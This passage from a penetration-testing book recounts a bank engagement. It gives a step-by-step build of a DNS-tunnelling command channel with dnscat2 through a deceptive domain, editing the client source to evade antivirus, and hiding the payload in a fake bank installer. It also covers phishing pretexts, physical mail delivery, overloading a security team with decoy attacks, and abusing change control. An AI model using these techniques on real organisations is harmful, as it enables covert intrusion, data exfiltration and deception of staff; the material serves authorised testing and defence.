systems.\nThese are questions I've learned to ask. The quickest way to complete the\ntest was to compromise the Tivoli management platform that updated\napplications on the ATMs. I then sent a command to all endpoints to run\nthe solitaire game, which dutifully appeared on the lab ATM in front of\nme. Satisfied, I decided that was a good point to walk up the road and grab\na bite to eat. Next to the Surinamese takeaway I frequently patronized was\nan ATM of the bank I was working for. A bemused pair of customers was\nstaring at the solitaire game running on the screen. The first thing I\nthought was “that's a coincidence” until the actual thinking part of my\nbrain kicked in and I ran back to the lab, dialing as I went. My point is that\neven if someone tells you it's a one-way street—look both ways before\ncrossing it.\nAPT Modeling versus Traditional Penetration Testing\nAPT modeling, on the other hand, is not something that is often performed\nand when it is, it's usually not done properly. The (growing) problem with\npenetration testing in general is that it's full of charlatans. It's a specialized\nfield within a specialized field and the most insight that a client will get as to\nthe competence of the consultant will be how shiny the end report is.\nNever ever trust pen testing certifications as proof of ability when hiring\nconsultants—they are all, without exception, garbage. These “qualifications”\nare issued by cynical opportunist parasites who have used FUD to establish\nthemselves as a standard. They claim to improve the baseline skillset while\nreducing it to probably the lowest point it's ever been.\nI can't name names but the reason that these certifications do so well is\nbasically this: two firms compete for a consultancy engagement. The person\nwho has to select a vendor has no experience in engaging such people and the\nonly notable difference he can see is that one has a certification and one\ndoesn't. He selects the former company and explains to the latter how the\ndecision was made. You can bet that salesman is going back to the office and\nscreaming about lost work and “underqualified” consultants. This is a\nparticular problem in the UK for some reason. Make them prove their\nknowledge. Better yet—for long-term framework engagements—bring in two\nor three firms for a day and make them compete against each other on the\nsame environment. Make them sweat. You'll soon separate the men from the\nboys (or girls, as we have women pen testers now). Oh, and ask if one of your\ntechnical people can be involved to see what you're paying for. Some will turn\ngreen and run for the door; others will mumble about “proprietary” or “secret”\nknowledge. Immediately terminate the conversation with anyone who is not\nwilling to work transparently.\nBackground and Mission Briefing\nThe bank had just appointed a new Chief Information Security Officer (CISO)\nwho was very keen to put the security of the business to the test in a real-\nworld manner. This was a smart play on his part, as we could test well beyond\nthe limits of a compliance exercise and any vulnerabilities discovered could be\nattributed to his predecessor. The briefing was pretty much this: “Hack us.\nWhen you have, come in and give a presentation to the board that will scare\nthe hell out of them and get me a bigger budget. Just don't do anything\nillegal.” As if I would.\nThis was going to be a particularly challenging test and consequently we were\ngoing to need to solve some tricky problems:\nHow were we going to deliver our payload in a Spartan, security conscious\nenvironment?\nHow could we establish and manage command and control in an\nenvironment where very few users had direct access to the Internet and\nthose who did had to endure an extremely restrictive proxy?\nAPT tests involve, whether directly or indirectly, human manipulation.\nHumans aren't computers. They will get suspicious and you can't keep hitting\nthem with attack after failed attack—your target will soon realize they are\nbeing targeted. This is also an environment where security policy mandates\nthat screen savers carry security conscious warnings: the “Don't take candy\nfrom strangers” type of stuff. One problem at a time. Let's do things the other\nway around and first talk about our C2.\nCommand and Control Part III: Advanced Channels and\nData Exfiltration\nIt's true that there is no direct user land connection to the Internet but\nremember earlier when I said that people often don't fully understand the\nenvironments they manage? That is no less true here than in most places. You\ndon't need a “direct” connection to the Internet, you just need to be able to get\ndata out to our C2 and that is by no means the same thing. You could hope we\nget a user with proxy access and inherit those permissions to talk out to the\nweb, but that would be leave you with a heavily restricted connection which\ncarries far too much uncertainty. You can do better. Consider the following\nexample.\nI'm sitting on the banking LAN and I type the following command and get the\nfollowing output:\n> ping www.google.com\nPinging www.google.com [74.125.136.147] with 32 bytes of data:\nRequest timed out.\nRequest timed out.\nRequest timed out.\nPing statistics for 74.125.136.147:\nPackets: Sent = 3, Received = 0, Lost = 3 (100% loss)\nWhat exactly is happening here? “Ah,” you reply, “You're an idiot. You don't\nhave access to the Internet (or at least ICMP packets are being restricted), so\nyou're getting a timeout. What did you think would happen?”\nThat's not all that's happening.\nI pinged a Fully Qualified Domain Name and the packets were dropped but\nfirst it was resolved into an IP address. A public Internet IP address. The local\nDNS server can resolve IP addresses, which means at some point in the DNS\nchain a host is talking to Google. This local DNS server probably doesn't have\ndirect access to the Internet either, but it can certainly talk to the bank's\nInternet-facing DNS to resolve queries. The fact that the ICMP packets were\ndropped is irrelevant: I can use DNS resolution itself as a means of command\nand control. If you look at a dig query, things might make more sense:\ndig +trace www.google.co.uk\n. 8238 IN NS b.root-servers.net.\n. 8238 IN NS f.root-servers.net.\n. 8238 IN NS h.root-servers.net.\n. 8238 IN NS m.root-servers.net.\n. 8238 IN NS j.root-servers.net.\n. 8238 IN NS d.root-servers.net.\n. 8238 IN NS g.root-servers.net.\n. 8238 IN NS k.root-servers.net.\n. 8238 IN NS i.root-servers.net.\n. 8238 IN NS a.root-servers.net.\n. 8238 IN NS c.root-servers.net.\n. 8238 IN NS e.root-servers.net.\n. 8238 IN NS l.root-servers.net.\n;; Received 228 bytes from 8.8.4.4#53(8.8.4.4) in 15 ms\nuk. 172800 IN NS nsa.nic.uk.\nuk. 172800 IN NS nsb.nic.uk.\nuk. 172800 IN NS nsc.nic.uk.\nuk. 172800 IN NS nsd.nic.uk.\nuk. 172800 IN NS dns1.nic.uk.\nuk. 172800 IN NS dns2.nic.uk.\nuk. 172800 IN NS dns3.nic.uk.\nuk. 172800 IN NS dns4.nic.uk.\n;; Received 454 bytes from 193.0.14.129#53(193.0.14.129) in 28 ms\ngoogle.co.uk. 172800 IN NS ns3.google.com.\ngoogle.co.uk. 172800 IN NS ns4.google.com.\ngoogle.co.uk. 172800 IN NS ns1.google.com.\ngoogle.co.uk. 172800 IN NS ns2.google.com.\n;; Received 116 bytes from 156.154.103.3#53(156.154.103.3) in 2 ms\nwww.google.co.uk. 300 IN A 74.125.21.94\n;; Received 50 bytes from 216.239.36.10#53(216.239.36.10) in 32 ms\ndig +trace works by pretending it's a name server using iterative queries and\nfollowing the referrals all the way. Here you see the names of the\nauthoritative name servers for google.co.uk as well as the final IP resolution.\nOur payload (when you decide what it is) needs to be able to communicate to\nour C2 via recursive DNS queries that are themselves the data being received.\nIn addition to that, information needs to be passed back to the payload as\nDNS data in some way. The benefits are that this will cut through their border\nsecurity like a hot knife through butter and it's stealthy, though not\nundetectable.\nYou'll need a couple of things before you can start building this solution:\nA domain name registered specifically for the attack. This can be anything\nyou want.\nOur C2 server needs to be made authoritative for this domain name.\nAn additional service must be created that runs on our C2 server and\nmasquerades as a DNS service while its actual sole purpose is to\ncommunicate with our payload.\nThis attack is not a new concept but is not well understood. The first proof of\nconcept was created by DNS and security guru Dan Kaminsky in 2004 with\nOzymanDNS. The idea was built on by Tadek Pietraszek with dnscat, but that\ntool is limited in that it requires a Java VM to run. Ron Bowes created dnscat2\nto implement and demonstrate DNS tunneling specifically for the sort of\npurposes you need. It's flexible, it does what you need, and the payload\nportion of the source code is in C, so you can compile it on whatever you want\nand alter it so the AV won't see it.\nThe dnscat2 effectively only tunnels in through DNS—dynamic and reverse\ntunnels are not supported, nor is file transfer. That's no problem here though\nas we're just going to combine and deploy it with our own SSH payload,\nallowing secure file transfer and command execution. The author of the\nsoftware is wise to warn against trusting the built-in encryption, as it's\nhomemade. While it's likely more than good enough for our purposes, we're\ntunneling the SSH protocol so that problem is solved for us as well.\nWe'll register the domain name anti-virus-update.com and make our C2\nserver the authoritative name server for it. This time when I run dig, I get\nthis:\ndig +trace test.anti-virus-update.com\n. 14609 IN NS a.root-servers.net.\n. 14609 IN NS b.root-servers.net.\n. 14609 IN NS c.root-servers.net.\n. 14609 IN NS d.root-servers.net.\n. 14609 IN NS e.root-servers.net.\n. 14609 IN NS f.root-servers.net.\n. 14609 IN NS g.root-servers.net.\n. 14609 IN NS h.root-servers.net.\n. 14609 IN NS i.root-servers.net.\n. 14609 IN NS j.root-servers.net.\n. 14609 IN NS k.root-servers.net.\n. 14609 IN NS l.root-servers.net.\n. 14609 IN NS m.root-servers.net.\n;; Received 228 bytes from 8.8.4.4#53(8.8.4.4) in 17 ms\ncom. 172800 IN NS i.gtld-servers.net.\ncom. 172800 IN NS m.gtld-servers.net.\ncom. 172800 IN NS l.gtld-servers.net.\ncom. 172800 IN NS e.gtld-servers.net.\ncom. 172800 IN NS g.gtld-servers.net.\ncom. 172800 IN NS b.gtld-servers.net.\ncom. 172800 IN NS d.gtld-servers.net.\ncom. 172800 IN NS a.gtld-servers.net.\ncom. 172800 IN NS f.gtld-servers.net.\ncom. 172800 IN NS h.gtld-servers.net.\ncom. 172800 IN NS j.gtld-servers.net.\ncom. 172800 IN NS c.gtld-servers.net.\ncom. 172800 IN NS k.gtld-servers.net.\n;; Received 504 bytes from 202.12.27.33#53(202.12.27.33) in 109 ms\nanti-virus-update.com. 172800 IN NS newyork.anti-virus-\nupdate.com.\nanti-virus-update.com. 172800 IN NS paris.anti-virus-\nupdate.com.\nanti-virus-update.com. 172800 IN NS london.anti-virus-\nupdate.com.\n;; Received 155 bytes from 192.52.178.30#53(192.52.178.30) in 580 ms\nanti-virus-update.com. 172799 IN NS paris.anti-\nvirus-update.com.\nanti-virus-update.com. 172799 IN NS newyork.anti-\nvirus-update.com.\nanti-virus-update.com. 172799 IN NS london.anti-\nvirus-update.com.\ntest as a host does not exist but that doesn't matter. What's important is that\nthe request to resolve the host is being referred up the chain until it reaches\nour C2 server. This way data can be encapsulated within DNS requests. The\nmost flexible type of DNS record is the TXT record. This can be used to store\narbitrary data that can be used to provide information about the domain in\nquestion (such as SPF records—more on that later). It can contain any data\nyou want (within size constraints) and can be updated on the fly. As a result,\nyou can also encapsulate data and commands within a DNS response. See\nFigure 3.1.\nFigure 3.1: The beauty of this setup is that if your C2 is disrupted by security\noperations, you can point your DNS at another server.\nThere are three ways such an attack may be detected:\nHost-based malware detection/antivirus. In this case, you can compile the\ndnscat2 payload any way you want to avoid AV signatures.\nSignature-based traffic analysis. Unlikely but not improbable.\nHeuristic-based DNS anomaly detection. Given that DNS has at its core a\nvery simple function—resolving hostnames to IP addresses—there are\nways that this traffic can look suspicious at the border. We're resolving a\nlot of hosts on the same domain in quick succession as well as making a\nlot of TXT lookup requests. In general, a client host doesn't have a lot of\nreasons to even request TXT records. In anything but a high-security\nenvironment, you could probably safely not worry that this level of\ninspection was not being carried out, but here I will assume it is and plan\nour attack accordingly.\nNotes on Intrusion Detection and the Security Operations Center\nWe've talked at length about the need to keep payloads below the radar of\nantivirus or malware detection products. However, this is only the tip of the\niceberg. Modern intrusion detection systems are advanced, intelligent, and\ncollaborative and can process event information from virtually any kind of\nserver, device, or network segment. At its simplest, this includes suspicious\ntraffic (like a port scan) or several failed logins in a row on a Cisco router. A\nspecific behavior can be included and defined as a security event and\nintegrated into the central monitoring system. IDS will receive its data from\nthree places:\nNetwork Intrusion Detection System (NIDS) for passive sniffing interfaces\nanalyzing payload data and monitoring for potentially malicious activity.\nThe NIDS will get its data directly from the switch in that segment via a\nphysical span, tap, or mirror port so you don't hose your network's core\nbandwidth.\nHost-based Intrusion Detection System (HIDS) for spotting problems on\nendpoints, including file integrity monitoring, rootkit checks, and\nWindows Registry checks.\nThe IDS monitors network traffic for malicious behavior, system log\nmessages, and user activity.\nThat's great, but on any given network, that will produce a lot of data that has\nto be monitored, acted upon, and stored for long-term analysis or research.\nThat's where the Security Operations Center (SOC) comes in.\nThe SOC Team\nThe composition of a SOC team varies greatly based on the needs and budget\nof the organization in question. Some companies prefer to outsource these\nservices to a third-party specializing in network defensive monitoring. In the\ninstance of an international bank, however, you can assume the team will\nlook like this:\nShift manager—Responsible for handovers between shifts and associated\nduties such as briefing the next shift on the current operational status,\nongoing security incidents, and so forth.\nFirst line SOC analysts—Working in shifts 24/7 monitoring the SIEM\n(Security Incident Event Management)—more on that in a minute. If an\nattack is detected, a ticket is raised and passed to the second line analysts.\nSecond line SOC analysts—Also available 24/7, although not necessarily\non site. Will determine if the ticket is a false positive or needs to be\nescalated to the third line analysts.\nThird line SOC analysts—Technically available 24/7 depending on the\nnature of the incident. If the ticket has reached this point, there is likely to\nbe a serious ongoing security incident or “active shooter” scenario.\nHow the SOC Works\nUnderstanding how an SOC works is important because these are the people\nyou have to beat in an APT modeling exercise. Without exception they have a\nstrong dislike of penetration testers, which all things being equal is perfectly\nunderstandable. See Figure 3.2.\nFigure 3.2: A basic intrusion monitoring setup.\nThe important takeaway of this section is that response time (by the first line)\nis not the same thing as reaction time (the period between the response time\nand the event resolution). Once an event has been flagged, a series of steps\nhas to take place to mobilize a response.\nSOC Reaction Time and Disruption\nThe effective reaction time of the SOC is variable. In the final hour of a shift\nchange in the early hours of the morning will likely be the time when the SOC\nreaction time is at its slowest. If you suspect an attack is likely to draw\nattention from the SOC and are unable to discover shift handover times, aim\nto have the attack go live between 3:00 a.m. and 4:00 a.m.\nA SOC can also be disrupted and the effective reaction time increased in other\nways. Stage an attack on a different part of the target's infrastructure (such as\nthe public-facing Internet servers) and generate a lot of traffic. Vulnerability\nscanners and brute force authentication attacks from multiple IPs are a good\nstart. Aim to put as many tickets between you and your attack as you can.\nIDS Evasion\nIn the first chapter, you learned about the importance of antivirus evasion.\nYou can do something similar with IDS. It benefits a tester to be able to\nreplicate target conditions in a lab using VM technology. The most popular\nvendors all have trial versions you can download and play with—you don't\nhave to replicate a complex network but being able to see how IDS responds\nto your traffic can save you a lot of work and teach a lot about security\noperations. As of this writing (and in my humble opinion), the best vendor in\nthis space is AlienVault. Their technology encompasses everything from NIDS\nand HIDS to SIEM. It is a collection of technologies drawn from different\nplaces and integrated. Many SOCs are based on this tooling and it can pull\ndata in from pretty much anything (if it can't, you can write a plugin so it\nwill). Download their USM all-in-one product as a free trial and play with it,\nunderstand its OTX (Open Threat eXchange) integration and how that is\nsignificant in a world where such intelligence needs to be shared on a daily\nbasis.\nThe reasoning behind choosing to build the C2 infrastructure in this book\naround the SSH protocol was not just the convenience it offers by already\nencapsulating much of the functionality you need, but because it looks like\nlegitimate traffic to network monitoring. It doesn't matter how many tunnels\nyou have going over the connection or what direction they are going—it still\njust looks like an outbound SSH connection, which in and of itself will not\ntrigger an alarm (unless a specific policy is configured to do so, which is\nhighly unlikely).\nFalse Positives\nOne final point, given the number of events that will be generated vis-à-vis\nthe resources of the SOC and its need to eliminate false positives, assets\nmonitored by IDS are given a numerical value that's passed to a formula when\ntechnology makes a decision as to whether or not an event is considered\nworthy of flagging in the SIEM. An asset value can be 0 (least important)\nthrough 5 (most important). The formula takes into consideration event\npriority (also 0 through 5) and the reliability of the event detection (0 through\n10). The formula looks like this:\nThis effectively allows security to be broken into percentiles and categorized\nand reacted to accordingly. This is fine (indeed necessary) to a certain degree.\nThe problem is that it's not always clear what the asset value should be. To\nput it another way, an attack triggered on an asset with a low value and\npriority with a rule that is not considered to be sufficiently reliable is not\ngoing to get flagged. In an APT scenario where an attacker may have to stay\nhidden for a long time while avoiding detection in a security monitored\nenvironment, the attacker should aim to compromise endpoints that are going\nto have the lowest asset value as is reasonably possible to use for further\nprobing. Modern printers, for example, will be attached to the network and\nhave functionality that will likely extend beyond what the device needs. As\nsuch, they can be utilized to store files, tools, and in some cases provision\nattacks. A Cisco router will likely be considered a high-value asset but\nmonitoring usually has to be carefully tuned to avoid excess false positives. A\nlight port scan coming from a Cisco device will likely not be flagged or be\nimmediately closed by the SOC team. However, modern Cisco routers have an\nimplementation of the TCL scripting language installed by default and while\nit's not a complete implementation (sadly the Expect module is not supported\nfor example), it can still be used to script attacks and facilitate low and slow\nrecon.\nEnough said. It's time to think about how we're going to deliver our payload.\nPayload Delivery Part III: Physical Media\nWe've pretty much ruled out the web as a viable vector of attack and email\nwith any kind of attachments is going to be subject to considerable scrutiny.\nWhat does that leave us with? Plenty, but for this test we're going to go old\nschool. The easiest way to get a payload into a physically high-security\nenvironment is to go low tech. FedEx packages are not going to get analyzed\nby border malware prevention systems—they're going to be delivered to\nsomeone's desk.\nA Whole New Kind of Social Engineering\nYou have virtually unlimited opportunities for a social engineering attack here\nand if you put in a little effort you come up with some very effective pretexts.\nStaff is warned constantly to watch what they click but not what they open in\nthe mail. You could send your payload directly on an optical disk or a thumb\ndrive or you could have an official looking letter giving instructions to the\ntarget. You could target different staff in different buildings and different\ndepartments, reducing the possibility of anyone comparing notes. The easiest\nway to build a target list is the business social network LinkedIn. You don't\nneed to scour through people's profiles—just enter the business name and\nyou'll get a list of everyone working there who's signed up to the site and their\njob title. You can derive their email addresses by determining what the\nconvention is through Google searches or PGP lookups or however you want\nand then apply that to the list of names.\nTarget Location Profiling\nOur target has over 20 HQs in this country alone (never mind retail branch\noffices) and each building has a code. Each desk in the building is uniquely\nidentifiable following this code; for example, the data center has a code of MZ.\nSomeone on the fourth floor of this data center at desk 298 will have the\nunique delivery code of MZ4.298. This allows for easy internal mail\nreferencing as well as giving visitors (from other HQs) the ability to quickly\nfind someone when attending meetings and so forth. It is convention within\nthe bank that this code be included in the email footer. I know this because\nI've done a lot of work for them, but an attacker will have to do some more\nlegwork.\nSome mail servers will tell you if an email address is valid, some won't. It\ndepends on how they respond to a manual RCPT TO command. Some will\nrespond with a not valid message, whereas others will simply respond OK and\nthen bounce the message. It doesn't really matter in our case, but always test\nwhich it is before initiating a spear phishing campaign, as it's nice not to have\nany of our messages rejected because there was an exception in the naming\nconvention. Some mail servers will block you as a potential spammer if your\nIP racks up too many failed deliveries.\nGathering Targets\nFirst you need to build your target list. What you want is a list of about 100\nnames in different departments. It doesn't matter too much which\ndepartments at this point, just try and get an even spread. The point is you\nwill need to create a pretext—any pretext really—to email the people on this\nlist and get a response; the response will contain the individual building code\nallowing you to very specifically deliver the payload within the accepted and\ntrusted conventions of the bank. The following letter\nDear Dan,\nIt was great to catch up at Infosec last week. If you're up for a\nbeer this Friday I'll be in town.\nRegards,\nDave\nis a simple example that might elicit the following response:\nDave,\nI think you've got the wrong Dan!\nCheers,\nDan\nIT Systems Engineer\nPayment Systems\n23 Walton Street\nMZ2.324\nIt doesn't matter; be creative.\nOnce you have a list of targets, addresses, and building codes you can think\nabout what you want to deliver. There is the dnscat2/SSH payload bundle, but\nyou need to dress it up as something convincing and configure your\nenvironment. So….\nStage I: Server Configuration\nIn addition to your existing C2 infrastructure, you need to install the server\nside of dnscat2, which is straightforward enough. The server element is\nwritten as a Ruby script so you just need to satisfy some prerequisites. On\nLinux, use this command:\n$ sudo apt-get install ruby-dev\nto grab the Ruby development tools and use this command:\n$ git clone https://github.com/iagox86/dnscat2.git\n$ cd dnscat2/server/\n$ sudo gem install bundler\n$ sudo bundle install\nto download dnscat2 and install its dependencies. You can execute the server\nsimply by running the following (appending the carrier domain).\n# ruby ./dnscat2.rb anti-virus-update.com\nStage II: Client Configuration\nAs the dnscat2 client will certainly be detected out of the box by AV, you need\nto make some modifications to the C source before compiling it. Modification\nof the source code of an executable is effective in bypassing virus detection.\nDepending on the signature, this could be as simple as changing the text of\nsome message within the code, or it might be more complicated, requiring the\nuse of different function calls or the reordering of code. Looking through the\nsource code of dnscat.c, you will see multiple simple signatures that would\nidentify this as potentially hostile, including a bunch of printf statements\nthat you can live without anyway. For example:\nif(optind >= argc)\n{\nprintf (\"Starting DNS driver without a domain! This will only\nwork if you\\n\");\nprintf (\"are directly connecting to the dnscat2 server.\\n\");\nprintf (\"\\n\");\nprintf (\"You'll need to use --dns server=<server> if you\naren't.\\n\");\ntunnel_driver = create_dns_driver_internal(group, NULL,\n\"0.0.0.0\", 53, DEFAULT_TYPES, NULL);\n}\nRemove these printf lines (as well as other such lines from the source),\ncompile the code (I use MinGW but use Visual Studio if you must), and see\nwhat Virus Total makes of it, as shown in Figure 3.3.\nFigure 3.3: Mmmmmm. Stealthy.\nNow you need to make the whole thing look presentable and legitimate.\nWhen delivering payloads in this manner, I suggest packaging everything\ntogether using a professional installer such as InstallShield or Inno (the latter\nis free and open source). Users are more trusting of legitimate looking\npackages and this allows you to get creative with bank logos and so forth. The\ncompany has a Windows package for online banking that's free for download,\nso I'll acquire that and mirror its style as much as possible. I'll also add a\ndummy application that purports to be banking software of some kind (this\ncan be anything that supports your pretext). How you go about this is entirely\nup to you. If you have time, create something impressive; if you don't, a\ncommand-line app that generates a contrived library error when run is an\noption. The important thing is that our payloads are installed to somewhere\nthey won't be found and executed, whereas our dummy application should be\nthe thing that draws attention. It should install with a desktop icon etc. and\nnot arouse (immediate) suspicion. Optionally, you could also drop the\nPowerView PowerShell script to dump users and systems from AD so that\neven if our access is short-lived, we have considerable information to work\nwith for future attacks, both technical and social.\nStage III: Physical Packaging\nAgain, the goal is to look as legitimate as possible. If you're deploying our\npackage on an optical disk, use a label printer and really make it professional.\nIn this instance I will deploy a mail slip with it sourced from the bank in\nquestion with a quick written note to support the pretext.\nThe next trick is to get the package into the bank's internal mail. This is easier\nthan it sounds. When working for this bank in the past and waiting around in\nreception, I would frequently see employees passing packages to the front\ndesk for internal delivery (basically just throwing it into a drop box). As long\nas everything looks legitimate (with the correct building codes etc.) it's that\nstraightforward and that's why detailed research is critical. In this case,\nrunning in off the street and cutting the line works fine—you're important and\nbusy after all. Don't queue; if you've got time to queue, you've got time to do it\nyourself.\nThe pretext can be anything you want as long it looks official, appears to come\nfrom an official source, and seems mandatory. Loads of things are mandatory\nin a corporate environment (compliance trainings are a good example), but\nthink about why it would be arriving on physical media—is it too confidential\nto send via email? Has the employee been selected from a short list for\nwhatever reason—should they feel privileged to get it? Is completion essential\nto make their bonus? Threaten people's bonuses and you can get them to do\nanything.\nThe Attack\nYou have the upgraded C2 and a physical package deployed to several bank\nHQs addressed to the targets using the correct building codes, conventions,\nand other nomenclature. It's a well-planned attack and someone will bite. In\nthe meantime, what should you attack when you gain access? Payment\nsystems seem like an obvious answer but being able to gain access to payment\nsystems and being able to put your hands on the money are two very different\nthings. An attacker might get away with it once, but any amount of money\nthat would make such a risk viable would trigger auditing and certainly result\nin invoking the so-called two-tap principle where another set of eyes would\nhave to confirm funds transfer. You'd have to be very confident in your\nunderstanding of the systems in question, have compromised multiple users,\nand be able to control the flow of information to a certain extent. The keys to\nthe kingdom are not the payment systems, but the change control\nmechanisms.\nChange control is the systematic approach to logging/approving any changes\nto a specific product, firewall ruleset, software upgrade, or anything else. It\nalso applies to physical access control. An international bank has many, many\ndifferent technologies and depends on outsourcing for much of its day-to-day\nbusiness. Change control will be used to decide who will have access to what\nand when. For example, a vulnerability audit has been requested on a core\nbanking switch that will require physical access to the server hall to test.\nSomeone will have to sign off on this and effectively say, “This person has a\nbusiness need to be granted access to site ABC on these dates and they will\nadditionally need access to server hall XYZ.” This will go into change control\nto be confirmed or denied.\nIf confirmed, when the visitor shows up at the site, security will check his ID\nand give him a temporary pass. If he needs access to the server halls then\nonce inside the security perimeter, he hands over his temp badge for a hall\npass which won't allow the user to exit the building. Then he'll have to swap it\nback when he leaves. This way the hall passes can't leave the building. This all\nsounds very secure. The only problem is that change control is predominantly\nonly useful for logging changes so that if something breaks, there is an audit\ntrail to show exactly what happened and what needs to be rolled back.\nIn practice, unless a particular change is unusual, it's a rubber stamp process,\nparticularly for physical access control. So many people come and go every\nday that it can't be anything else. In principle, the CISO has to approve a\nrequest for a security consultant to enter the server halls, but that's someone\nat the very top of the ladder who won't be familiar with what day-to-day tests\nare being carried out or the names of every consultant who enters her\ndomain. If a team leader files such a request in change control it's going to be\napproved. Generally, it looks like this:\nWho needs access? Rob Hackerman of Hackerman Security Services.\nWhat do they need access for? Vulnerability audit of environment XYZ.\nWhat access is required? Building access at site MZ. Hall access to ABC.\nHave they been screened by security in the past? Yes. Consultant is\nfrequently present at MZ and HJ.\nIt would be nice if you could get access to a physical site and plug your laptop\nin and look around, but wouldn't it be great if you could get access to the\nserver halls? The damage an attacker could do under such circumstances\nsimply cannot be understated. The change control process happens many\ntimes a day and the system can only be accessed from within the bank's\ncorporate Intranet (or via VPN), so there is no particular reason to be\nsuspicious that a contractor needs access to resources to do his job. We could\nput any name in the system we want as long as we have ID to back it up, but\nthat doesn't have to be a passport or anything that's difficult to forge. I once\nused a fake Maryland driver's license to get into a building (outside the United\nStates, so no laws broken). It wouldn't have fooled a Maryland cop but these\nguys had never seen one before and were none the wiser.\nWhen the attack goes live, dnscat2 is going to talk back to our C2 and allow us\nto tunnel into our SSH payload. The dnscat2 UI is made up of windows. The\ndefault window is called the “main” window. You can get a list of windows by\ntyping\n> windows\nor\n> sessions\nat the dnscat2 prompt. Once you have a live target, that will yield the\nfollowing:\n0 :: main [active]\ndns1 :: DNS Driver running on 0.0.0.0:53 domains = anti-virus-\nupdate.com [*]\nTo create our tunnel, use this:\nlisten [0000:]443 localhost:443\nIt will create a tunnel on port 443 of the C2 server and terminate at 443 on\nour compromised machine (assuming here of course that SSH is listening on\n443).\nYou now have secure shell access to the target host and can execute\ncommands and transfer files, all through indirect DNS requests and\nresponses. Any web applications that are capable of doing this in the target\nnetwork (including change control) will be using AD to handle authentication.\nThat is, access will be determined via a central control list that is linked to the\nuser's domain account rather than from an application-specific\nlogin/password. This is interesting because at this point you can either deploy\na keylogger to grab the target's credentials or inject the IE proxy attack\ndirectly into the web browser as in Chapter 1. Both approaches have their\nmerits, although the former will likely require privilege escalation to succeed\nas well as a lot more time. That's generally not a problem but we discuss that\nprocess in depth in the next chapter in a longer-term engagement.\nAll you need to know now is the name of the change control server that once\nagain you can derive from AD. With access to the change control system, you\ncan grant yourself access as a consultant or contractor to any facility in the\nbank.\nI talked earlier about the SOC and this is an anecdote worth repeating. This\nsection describes an attack I carried out in 2012. Nobody questioned me (or\nindeed really acknowledged me) until I'd completed the server hall aspect of\nthe engagement (took some pictures of core routing hubs) and decided to go\nupstairs to plug into the LAN to get a few screenshots. I was approached by\ntechnical security (who had noticed that the MAC address on my laptop\nwasn't registered). Without introducing themselves, they just asked, “Are you\ndoing a pen test?”\n“Yes,” I replied.\n“Great, let me just get your MAC so we don't get any more alerts.”\nI felt that rather defeated the point of the SOC, but this is complacency—one\nof the biggest enemies of security there is.\nSummary\nThe CISO got his scary presentation and the budget increase he wanted but in\nthe long term it's unlikely the exercise dramatically increased the security\nposture of the organization. You can prioritize security, you can throw gobs of\nmoney at it, but the bottom line is that you still have to be able to do business.\nIf you need people to come into your buildings and do work on a regular basis,\nthere needs to be a fluid way to allow this to happen that also considers the\nsecurity implications. In this instance, that failed.\nThe takeaway here is that the obvious systems to attack are not necessarily\nthe right ones. As noted above, as pen testers we could probably subvert the\npayment systems themselves but it would be hard to go from there to\nphysically removing money from the bank (as impressive a demo as that\nwould be). In this instance, we chose to hit the change control systems\nbecause they were more vulnerable and would allow an attacker much more\nflexibility in controlling and molding the environment as they see fit. Millions\nwere spent securing iPhone apps and retail banking websites. Nothing was\nspent testing the change control systems.\nExercises\n1. Familiarize yourself with the AlienVault USM product. Understanding\nwhat the other guy sees will change your own workflow for the better.\n2. Explore dnscat2 and its equivalents. Examine the traffic using Wireshark.\nHow could you make the traffic stealthier?\n3. What measures could you take to mitigate the DNS tunneling attack? One\noption is to separate internal and external DNS, but this is unlikely to be\npractical in a large company. What else could be done?\nChapter 4\nPharma Karma\nThroughout 2011, “Occupy Wall Street” protesters camped out in public parks\nacross the United States. They were angry about something.\nThey weren't sure what.\nTheir messages were incoherent. They wanted the government to fix things.\nThey wanted the government to stop corporate greed. But for all of the\nidealism behind the movement, the protesters missed one important\nfundamental point: corporations (like nation states) have escaped human\nscale. There is no “man” to fight, just a sprawling entity whose goals are\nperpetuation and expansion.\nWhat does this have to do with information security? Everything. Until you've\nworked for a massive corporation, it's difficult to really understand how they\nfunction; a collective of affiliated business units bound together through\nuncompromising process. A CEO is a figurehead, nothing more—someone to\nput a face to a new product in the case of Apple or someone you have to look\nup to know their name in the case of Verizon or whoever.\nPharmaceutical companies are no strangers to protest and 2011 was no\nexception. Groups picketing Novartis or Pfizer are so common as to not be\nworth a mention. Of course, expressing your objection to corporate policy (in\nthis case animal testing) by waving a banner is at best ineffective precisely\nbecause of these reasons. One day, one of these groups will learn basic system\nintrusion skills and they might achieve something.\nWho knows?\nWhen I attended the scoping meeting to discuss an APT modeling\nengagement with a large pharma, I discovered the remarkable phenomenon\nthat apparently no one in New Jersey walks anywhere. I'd decided to stay at\nthe Holiday Inn over the road from the company so I could just hop out of bed\nand not fuss with taxis or rental cars. Imagine my surprise when I found\nmyself looking down the business end of a large nightstick wielded by a\nsimilarly massive security guard. I explained I was there for a business\nmeeting while he nervously spoke into his walkie-talkie, “I don't know, he just\nwalked in here.” It all worked out but for the next day's meeting, I took the\nhotel's shuttle instead which was waved through without a second glance. I\nthen took the internal shuttle to the IT building and shoulder surfed my way\nin. All without a pass. I trust the irony of this is not lost on you.\nThis chapter makes vague mention of a technology called Hard Disk Firewall\nbut doesn't refer to it by name. The reason for this is not to subject my\npublisher to legal liability. However, the technology is described in great detail\non my website at www.wilallsopp.com if you'd like further information.\nBackground and Mission Briefing\nAnimal rights activists and affiliated groups were mounting an increasingly\nfocused Internet campaign against their targets. In the past, these tactics were\nlargely limited to email harassment and threats, but targeted attacks with an\nintention of compromising users were becoming increasingly common and\nmore sophisticated. The nightmare scenario in the organization I was talking\nto was physical attacks against their staff and tertiary attacks against their\nsuppliers (and the suppliers of their suppliers, etc.). Such an approach had\npreviously been highly effective in the UK, leading to the British government\nfinancially intervening in several cases to stop pharmaceutical facilities from\ngoing out of business. American protesters had learned these lessons well and\nthe SHAC model of protest (named after the animal rights group that\npioneered it) was becoming popular in the United States.\nKeeping employee details and client or supplier details secure while at the\nsame time available to those departments that needed such information to\nfunction was a challenge because external actors were only one part of the\nproblem. In the past, the organization had to contend with leaks by\nsympathetic employees as well. Subsequently, it was determined that some\nform of APT modeling scenario be attempted in order to illustrate the\nperceived risks and learn how best to mitigate them.\nWith this in mind and with an eye to saving money, the entire engagement\nwould be conducted internally with the assumption that an attacker had\ngained access in some way or that the attacker was not an external actor but\nan employee with legitimate access to the corporate network. The company\nalso placed a great deal of faith in an expensive hard disk firewall technology\nthey had recently deployed, software that claimed to be capable of stopping\n“all attacks, both known and unknown.” As you 